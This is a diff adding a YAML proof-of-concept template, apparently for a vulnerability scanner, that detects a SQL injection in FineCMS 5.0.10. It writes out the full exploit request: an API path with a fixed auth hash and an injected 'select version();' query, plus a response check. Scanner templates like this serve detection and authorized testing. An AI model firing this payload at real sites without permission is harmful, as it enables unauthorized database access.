@@ -1,0 +1,11 @@
+name: poc-yaml-finecms-sqli
+rules:
+  - method: GET
+    path: /index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df&param=action=sql%20sql=%27select%20version();%27
+    expression: |
+      response.body.bcontains(b"{"version()":")
+detail:
+  author: rexus
+  Affected Version: "5.0.10"
+  links:
+    - https://blog.csdn.net/dfdhxb995397/article/details/101385340
